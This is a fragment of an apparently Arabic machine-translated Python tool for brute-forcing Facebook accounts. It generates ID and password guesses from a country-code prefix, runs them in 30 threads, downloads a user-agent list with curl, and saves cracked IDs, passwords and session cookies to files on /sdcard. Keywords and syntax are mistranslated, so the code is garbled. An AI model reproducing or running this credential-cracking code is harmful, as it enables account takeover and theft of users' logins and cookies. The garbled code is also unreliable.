...
باستثناء  ModuleNotFoundError :
    ...
    نظام التشغيل . النظام ( "python DAMAR.py" )
...
لـ  xd  في  النطاق ( 10000 ):
    ...
    اوجين . إلحاق ( uaku2 )
جرب :
    نظام التشغيل . النظام ( "curl https://bacho1001.blogspot.com/2022/07/ua.html -o ua.html" )
باستثناء :
    يمر
...
def  linex ():
 ...
 الشيكات def ( oks ، cps ، twf ):
    إن  لم يكن  لين ( موافق ) ! =  0 :
        يمر
    إذا كان  len ( cps ) ! =  0 :
        طباعة ( ' \ n \ n \ x1b [1؛ 97m TOTAL OK: \ x1b [1؛ 97m٪ s   \ x1b [1؛ 97mFARES-OK.txt'  ٪ (
            H ، P ، str ( لين ( موافق ))))
        طباعة ( ' \ x1b [1؛ 97 م TOTAL CP: \ x1b [1؛ 97m٪ s \ x1b [1؛ 97mFARES-CP.txt'  ٪
              ( H ، P ، str ( len ( cps ))))
        طباعة ( ' \ x1b [1؛ 97 م TOTAL 2F: \ x1b [1؛ 97m٪ s \ x1b [1؛ 97FARES-2F.txt'  ٪
              ( H ، P ، str ( len ( twf ))))
...
def  cek_apk ( جلسة ، coki ):
    ...
    # ____________ #
def  xyz ():
    نظام التشغيل . نظام ( "play-audio WELCOME_TO_DAMAR_BOOT_818.mp3" )
    نظام التشغيل . Getuid
    نظام التشغيل . نظام ( "مسح" ) ؛ طباعة ( شعار )
    طباعة ( '            \ x1b [97m [ \ 033 [37؛ 41m MAINMENU    \ 033 [0؛ m]' )
    طباعة ( f "" )
    طباعة ( f " { BLUE } [01] { GREEN } ءدبلل دحاو بتكا" )
    طباعة ( f " { BLUE } [00] { GREEN }   " )
    طباعة ( f "" )
    طباعة ( f " \ 033 [1؛ 91m ========================================== ================ " )
    LUQMAN  =  الإدخال ( "[√] اختار:" )
...
def  Tabii ():
    ...
    طباعة ( f "" )
    طباعة ( '21892 21891 21894' )
    طباعة ( f "" )
    لينكس ()
    الكود  =  المدخلات ( 'دوكال لخدا:' )
    نظام التشغيل . نظام ( "مسح" )
    طباعة ( شعار )
    طباعة ( f "" )
    طباعة ( f "           \ x1b [97m [ \ 033 [37؛ 41m 5000 راتخا    \ 033 [0؛ m]" )
    طباعة ( f "" )
    Limit  =  int ( input ( 'لاثم: 1000، 2000، 5000، 10000 \ n \ n :' ))
    ...
    مع  ThreadPool ( max_workers = 30 ) مثل  yaari :    
        ...
        print ( f " { BLUE } cuntry you but { GREEN } libya" )
        طباعة ( f " { BLUE } رمزك { GREEN } " + كود )
        طباعة ( f " { BLUE } بدء البرنامج" )
        طباعة ( f ' { GREEN } =========================================== ================ ' )
        للحب  في المستخدم : _  
            uid  =  رمز + حب
            pwx  = [ حب ]
    ...
    جرب :
        لـ  ps  في  pwx :
            ...
            إذا كان  'c_user'  في  log_cookies :
                ...
                cid  =  coki [ 7 : 22 ]
                طباعة ( ' \ r \ 033 [1؛ 32 م [√] --------------------- [SAR-OK] ---------- ---------- [√] \ n الرقم: ' + uid + ' \ n الايدي: ' + cid + ' √ ' + ps +  ' \ n ملف تعريف الارتباط: ' + coki + ' \ n [√ ] ------------------------------------------------- - [√] ' )
                cek_apk ( جلسة ، coki )
                افتح ( '/sdcard/SAR-OK.txt' ، 'a' ). اكتب ( cid + '|' + ps + ' \ n ' )
                حسنًا . إلحاق ( سيد )
                استراحة
             "نقطة تفتيش"  elif في  log_cookies :
                ...
                cid = coki [ 24 : 39 ]
                الأحمر  =  ' \ 033 [1 ؛ 31 م'
                print ( f ' \ r { Red } [×] -------------------- [SAR-CP] ------------- -------- [×] \ n الرقم: ' + uid + ' \ n الايدي: ' + cid + ' √ ' + ps +  ' \ n [×] ---------- ----------------------------------------- [×] \ 033 [1؛ 97m " )
                افتح ( '/sdcard/SAR-CP.txt' ، 'a' ). اكتب ( cid + '|' + ps + ' \ n ' )
                cps . إلحاق ( سيد )
                استراحة
                ...
                افتح ( '/sdcard/SAR-2F.txt' ، 'a' ). اكتب ( cid + '|' + ps + ' \ n ' )
                twf . إلحاق ( سيد )
            آخر :
                يكمل
        حلقة + = 1
        sys . stdout . كتابة ( f ' \ r \ 33 [1؛ 37m [SAR] [٪ s] \ 33 [1؛ 97m [OK:٪ s ~ CP:٪ s]'٪ ( loop ، len ( oks ) ، len ( cps ) )) ،
        sys . stdout . تدفق ()
